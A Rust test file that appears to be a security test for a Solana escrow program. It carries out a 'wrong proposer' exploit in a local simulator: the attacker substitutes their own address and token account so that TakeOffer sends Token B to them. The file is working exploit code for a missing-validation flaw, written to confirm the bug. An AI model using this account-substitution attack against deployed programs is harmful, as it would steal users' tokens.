// Exploit: Wrong Proposer (Missing Proposer Validation)
//
// Vulnerability: The program does not verify the proposer matches the stored offer state.
// Attack: Attacker passes their own address as proposer when calling TakeOffer.
// Result: Token B is sent to attacker's ATA instead of the real proposer.

mod utils;

use utils::*;
use litesvm_token::{
    CreateAssociatedTokenAccount,
    spl_token::state::Account as TokenAccount,
    get_spl_account,
};
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    native_token::LAMPORTS_PER_SOL,
    signature::Signer,
    transaction::Transaction,
};
use spl_associated_token_account::get_associated_token_address;
use solana_system_interface::program::ID as SYSTEM_PROGRAM_ID;


#[test]
fn test_exploit_wrong_proposer() {
    println!("\n=== EXPLOIT TEST: Wrong Proposer (Token B Redirection) ===\n");
    println!("[Scenario] Attacker passes their own address as proposer to steal Token B");

    let mut scenario = setup_escrow_scenario();

    // Create attacker account
    let attacker = create_funded_account(&mut scenario.svm, 5 * LAMPORTS_PER_SOL);
    println!("[Setup] Attacker: {}", attacker.pubkey());
    println!("[Setup] Real Proposer: {}", scenario.proposer.pubkey());

    // Create attacker's ATA for Token B (to receive stolen tokens)
    let attacker_ata_b = CreateAssociatedTokenAccount::new(&mut scenario.svm, &scenario.payer, &scenario.mint_b)
        .owner(&attacker.pubkey())
        .send()
        .expect("Failed to create attacker ATA B");
    println!("[Setup] Attacker ATA B: {}", attacker_ata_b);

    // Create the offer (legitimate)
    println!("[Setup] Creating legitimate offer...");
    create_offer(
        &mut scenario.svm,
        &scenario.proposer,
        &scenario.mint_a,
        &scenario.mint_b,
        &scenario.proposer_ata_a,
        &scenario.offer_pda,
        &scenario.vault_ata,
        scenario.offer_id,
        scenario.bump,
    );

    // Record balances before attack
    let taker_b_before: TokenAccount = get_spl_account(&scenario.svm, &scenario.taker_ata_b)
        .expect("Taker ATA B should exist");
    let attacker_b_before: TokenAccount = get_spl_account(&scenario.svm, &attacker_ata_b)
        .expect("Attacker ATA B should exist");

    println!("[Setup] Taker Token B balance: {}", taker_b_before.amount);
    println!("[Setup] Attacker Token B balance: {}", attacker_b_before.amount);

    // EXPLOIT: Call TakeOffer with attacker as proposer instead of real proposer
    println!("\n[Attack] Calling TakeOffer with ATTACKER as proposer...");

    let take_ix_data = build_take_offer_data();

    // CRITICAL: Passing attacker.pubkey() instead of proposer.pubkey()
    // A secure program would check this against offer_state.proposer
    let take_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.taker.pubkey(), true),
            AccountMeta::new(attacker.pubkey(), false),  // EXPLOIT: attacker instead of proposer
            AccountMeta::new(attacker_ata_b, false),     // EXPLOIT: attacker's ATA
            AccountMeta::new_readonly(scenario.mint_b, false),
            AccountMeta::new_readonly(scenario.mint_a, false),
            AccountMeta::new(scenario.taker_ata_a, false),
            AccountMeta::new(scenario.taker_ata_b, false),
            AccountMeta::new(scenario.offer_pda, false),
            AccountMeta::new(scenario.vault_ata, false),
            AccountMeta::new_readonly(TOKEN_PROGRAM_ID, false),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
            AccountMeta::new_readonly(ASSOCIATED_TOKEN_PROGRAM_ID, false),
        ],
        data: take_ix_data,
    };

    let take_tx = Transaction::new_signed_with_payer(
        &[take_ix],
        Some(&scenario.taker.pubkey()),
        &[&scenario.taker],
        scenario.svm.latest_blockhash(),
    );

    let result = scenario.svm.send_transaction(take_tx);
    match &result {
        Ok(metadata) => {
            println!("[VULNERABLE] TakeOffer with wrong proposer succeeded!");
            println!("[Result] Logs:");
            for log in &metadata.logs {
                println!("         {}", log);
            }

            // Check if attacker received Token B
            let attacker_b_after: TokenAccount = get_spl_account(&scenario.svm, &attacker_ata_b)
                .expect("Attacker ATA B should exist");

            if attacker_b_after.amount > attacker_b_before.amount {
                println!("[EXPLOIT SUCCESS] Attacker received Token B!");
                println!("[EXPLOIT SUCCESS] Attacker Token B: {} -> {}",
                    attacker_b_before.amount, attacker_b_after.amount);

                // Real proposer should have received nothing
                let proposer_ata_b = get_associated_token_address(&scenario.proposer.pubkey(), &scenario.mint_b);
                match get_spl_account::<TokenAccount>(&scenario.svm, &proposer_ata_b) {
                    Ok(account) => {
                        println!("[Result] Real proposer Token B: {}", account.amount);
                    }
                    Err(_) => {
                        println!("[Result] Real proposer ATA B doesn't exist - they got nothing!");
                    }
                }
            }
        }
        Err(e) => {
            println!("[Result] TakeOffer failed: {:?}", e);
            println!("[Analysis] The program may have other checks that caught this.");

            let meta = &e.meta;

            
                for log in &meta.logs {
                    println!("         {}", log);
                }
            
        }
    }

    println!("\n=== END: Wrong Proposer Exploit ===\n");
}
